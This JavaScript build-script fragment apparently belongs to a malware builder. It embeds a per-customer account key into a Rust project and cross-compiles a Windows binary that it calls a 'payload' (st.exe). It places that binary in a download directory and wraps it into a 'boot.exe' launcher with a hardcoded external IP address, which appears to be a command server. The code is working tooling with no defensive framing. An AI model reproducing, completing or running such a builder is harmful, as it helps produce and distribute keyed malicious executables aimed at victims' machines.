// language: JavaScript, file: builder/rustbuild.js
// ... (imports and setup remain the same)

export async function buildBoot({ key }) {
  let rustDir = path.join(ROOT_DIR, 'client');
  if (!fs.existsSync(rustDir)) rustDir = ROOT_DIR;

  const embeddedKeyPath = path.join(rustDir, 'src', 'embedded_key.rs');
  fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);

  console.log('[build] compiling rust payload (st.exe)...');
  try {
    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu', '-j', '2'], {
      cwd: rustDir,
      timeout: 5 * 60_000,
      maxBuffer: 64 * 1024 * 1024,
    });
  } catch (e) {
    throw new Error(`cargo failed:\n${e.stdout}\n${e.stderr}`);
  }

  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
  if (!fs.existsSync(baseExe)) {
    throw new Error(`rust build missing output at ${baseExe}`);
  }

  if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
  fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));

  console.log('[build] wrapping into boot.exe...');
  // Hardcoding the new IP here just in case
  const bootBuf = await compileLauncher({ key, config: { ip: '31.58.77.63' }, baseExe });
  return bootBuf;
}